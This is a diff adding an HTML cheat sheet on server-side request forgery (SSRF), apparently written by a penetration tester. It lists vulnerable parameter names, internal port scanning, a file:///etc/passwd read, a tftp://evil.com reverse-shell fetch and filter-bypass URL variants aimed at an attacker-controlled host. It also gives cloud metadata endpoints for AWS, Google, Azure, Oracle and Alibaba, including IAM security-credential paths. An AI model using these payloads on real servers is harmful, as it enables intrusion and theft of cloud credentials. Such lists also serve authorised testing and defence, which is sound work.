@@ -1,0 +1,182 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>SSRF</title>
+</head><body><b><span style="font-size: 14pt">Server-side HTTP Redirection<br/>
+</span></b><b><span style="font-size: 14pt">Server-side Request Forgery (SSRF)</span></b><tt><span style="font-size: 10pt"><br/>
+</span></tt><tt><span style="font-size: 10pt"><br/>
+</span></tt><span style="font-size: 12pt"><b>LINKS</b></span><span style="font-size: 10pt"><tt><br/>
+</tt></span><span style="font-size: 10pt"><tt><br/>
+https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit<br/>
+http://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html<br/>
+https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html<br/>
+http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf<br/>
+https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF<br/>
+</tt></span><span style="font-size: 10pt"><tt>https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/</tt></span><b><span style="font-size: 12pt"><br/>
+</span></b><b><span style="font-size: 12pt"><br/>
+</span></b><span style="font-size: 12pt"><b>DETECTION</b><br/>
+</span><ul><li>Identify URLs which loads external content based on:</li>
+<li style="list-style-type: none"><ul><span style="font-size: 10pt"><li>IPs</li>
+<li>hostnames</li>
+<li>URL paramters</li>
+</span></ul>
+</li>
+<li>Replace original parameter value with crafted and check for response</li>
+<li>Replace original parameter with URL of your server and check incoming connections</li>
+<li style="list-style-type: none"><ul><li>If no incoming connections, then back-end can have restricted outbound connection</li>
+</ul>
+</li>
+</ul>
+<br/>
+<b>Common parameter names<br/>
+<br/>
+</b><tt>file=<br/>
+folder=<br/>
+location=<br/>
+style=<br/>
+locale=<br/>
+template=<br/>
+path=<br/>
+doc=<br/>
+display=<br/>
+source=<br/>
+load=<br/>
+pdf=<br/>
+read=<br/>
+dest=<br/>
+retrieve=<br/>
+</tt><tt>continue=</tt><br/>
+<br/>
+<br/>
+<span style="font-size: 12pt"><b>EXPLOITATION</b></span><br/>
+<br/>
+If port can be specified (<tt>http://mdattacker.net:22</tt>)<ul><li>then we can scan internal network for open ports. Use Intruder.</li>
+<li>we can scan for other services on 127.0.0.1</li>
+</ul>
+Attempt to load web page under our control and deliver XSS attack<br/>
+Attempt to load internal IP or internal file (<tt>file:///</tt>etc/passwd)<br/>
+Attempt to load external content via FTP (tftp://evil.com:12345/revshell)<br/>
+<br/>
+<span style="font-size: 12pt"><b>TRICKS</b><br/>
+</span><span style="font-size: 10pt"><br/>
+If target server accepts just images as URL paramter value then try to bypass by adding '?'<br/>
+</span><tt>https://play.esea.net/global/media_preview.php?url=http://ziot.org/?1.png<br/>
+<br/>
+</tt><br/>
+<b>FILTER BYPASS</b><br/>
+<br/>
+<tt>HtTp://mdattacker.net<br/>
+%00http://mdattacker.net<br/>
+http://mdattacker.net<br/>
+//mdattacker.net<br/>
+%68%74%74%70%3a%2f%2fmdattacker.net<br/>
+%2568%2574%2574%2570%253a%252f%252fmdattacker.net<br/>
+https://mdattacker.net<br/>
+http:\\mdattacker.net<br/>
+http:///mdattacker.net<br/>
+http://http://mdattacker.net<br/>
+http://mdattacker.net/http://mdattacker.net<br/>
+hthttp://tp://mdattacker.net<br/>
+http://mdsec.net.mdattacker.net<br/>
+http://mdattacker.net/?http://mdsec.net<br/>
+http://mdattacker.net/%23http://mdsec.net<br/>
+<br/>
+</tt>URL shortener tinyurl.com<br/>
+<br/>
+escape &quot;/&quot; with &quot;\/&quot; or &quot;//&quot; with &quot;\/\/&quot;<br/>
+try single &quot;/&quot; instead of &quot;//&quot;<br/>
+remove http i.e. &quot;continue=//google.com&quot;<br/>
+&quot;/\/\&quot; , &quot;|/&quot; , &quot;/%09/&quot;<br/>
+encode, slashes<br/>
+&quot;./&quot; CHANGE TO &quot;..//&quot;<br/>
+&quot;../&quot; CHANGE TO &quot;....//&quot;<br/>
+&quot;/&quot; CHANGE TO &quot;//&quot;<br/>
+<br/>
+<b><span style="font-size: 12pt">Cloud metadata files</span><br/>
+<br/>
+</b><b>AWS</b><br/>
+from <tt>http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories</tt><br/>
+<br/>
+<tt>http://169.254.169.254/latest/user-data<br/>
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]<br/>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]<br/>
+http://169.254.169.254/latest/meta-data/ami-id<br/>
+http://169.254.169.254/latest/meta-data/reservation-id<br/>
+http://169.254.169.254/latest/meta-data/hostname<br/>
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key<br/>
+</tt><tt>http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key</tt><br/>
+<br/>
+AWS - Dirs <br/>
+<br/>
+<tt>http://169.254.169.254/<br/>
+http://169.254.169.254/latest/meta-data/<br/>
+</tt><tt>http://169.254.169.254/latest/meta-data/public-keys/</tt><br/>
+<br/>
+<b>Google Cloud</b><br/>
+<tt>https://cloud.google.com/compute/docs/metadata</tt><br/>
+Requires the header <tt>&quot;Metadata-Flavor: Google&quot; or &quot;X-Google-Metadata-Request: True&quot;</tt><br/>
+<br/>
+<tt>http://169.254.169.254/computeMetadata/v1/<br/>
+http://metadata.google.internal/computeMetadata/v1/<br/>
+http://metadata/computeMetadata/v1/<br/>
+http://metadata.google.internal/computeMetadata/v1/instance/hostname<br/>
+http://metadata.google.internal/computeMetadata/v1/instance/id<br/>
+</tt><tt>http://metadata.google.internal/computeMetadata/v1/project/project-id</tt><br/>
+<br/>
+Google allows recursive pulls <br/>
+<tt>http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true</tt><br/>
+<br/>
+Google<br/>
+Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)<br/>
+<br/>
+<tt>http://metadata.google.internal/computeMetadata/v1beta1/</tt><br/>
+<br/>
+<b>Digital Ocean</b><br/>
+<tt>https://developers.digitalocean.com/documentation/metadata/</tt><br/>
+<br/>
+<tt>http://169.254.169.254/metadata/v1.json<br/>
+http://169.254.169.254/metadata/v1/ <br/>
+http://169.254.169.254/metadata/v1/id<br/>
+http://169.254.169.254/metadata/v1/user-data<br/>
+http://169.254.169.254/metadata/v1/hostname<br/>
+http://169.254.169.254/metadata/v1/region<br/>
+</tt><tt>http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address</tt><br/>
+<br/>
+<b>Packetcloud</b><br/>
+<br/>
+<tt>https://metadata.packet.net/userdata</tt><br/>
+<br/>
+<b>Azure</b><br/>
+Limited, maybe more exist?<br/>
+<tt>https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/</tt><br/>
+<tt>http://169.254.169.254/metadata/v1/maintenance</tt><br/>
+<br/>
+Update Apr 2017, Azure has more support; requires the header &quot;Metadata: true&quot;<br/>
+<tt>https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service</tt><br/>
+<tt><br/>
+http://169.254.169.254/metadata/instance?api-version=2017-04-02<br/>
+</tt><tt>http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text</tt><br/>
+<br/>
+<b>OpenStack/RackSpace </b><br/>
+# (header required? unknown)<br/>
+<tt><br/>
+</tt><tt>http://169.254.169.254/openstack</tt><br/>
+<br/>
+<b>HP Helion</b><br/>
+# (header required? unknown)<br/>
+<tt><br/>
+</tt><tt>http://169.254.169.254/2009-04-04/meta-data/ </tt><br/>
+<br/>
+<b>Oracle Cloud</b><br/>
+<tt><br/>
+http://192.0.0.192/latest/<br/>
+http://192.0.0.192/latest/user-data/<br/>
+http://192.0.0.192/latest/meta-data/<br/>
+</tt><tt>http://192.0.0.192/latest/attributes/</tt><br/>
+<br/>
+<b>Alibaba</b><br/>
+<tt><br/>
+http://100.100.100.200/latest/meta-data/<br/>
+http://100.100.100.200/latest/meta-data/instance-id<br/>
+</tt><tt>http://100.100.100.200/latest/meta-data/image-id</tt><b><br/>
+</b></body></html>
